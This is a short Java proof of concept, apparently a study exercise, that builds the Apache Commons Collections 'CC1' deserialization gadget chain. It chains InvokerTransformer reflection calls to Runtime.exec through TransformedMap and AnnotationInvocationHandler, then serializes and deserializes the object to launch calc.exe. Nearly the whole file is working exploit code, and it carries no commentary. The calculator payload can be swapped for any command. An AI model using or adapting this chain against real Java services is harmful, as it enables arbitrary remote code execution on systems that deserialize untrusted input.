package org.ixpqxi;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.ixpqxi.util.SerTools;

import java.io.IOException;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class SolvedProblemSetValue {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        });

        HashMap<Object, Object> map = new HashMap<>();
        map.put("value", "value");
        @SuppressWarnings("unchecked")
        Map<Object, Object> decorate = TransformedMap.decorate(map, null, chainedTransformer);

        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        Object obj = declaredConstructor.newInstance(Target.class, decorate);

        SerTools.serialize(obj);
        SerTools.unserialize("ser.bin");
    }
}
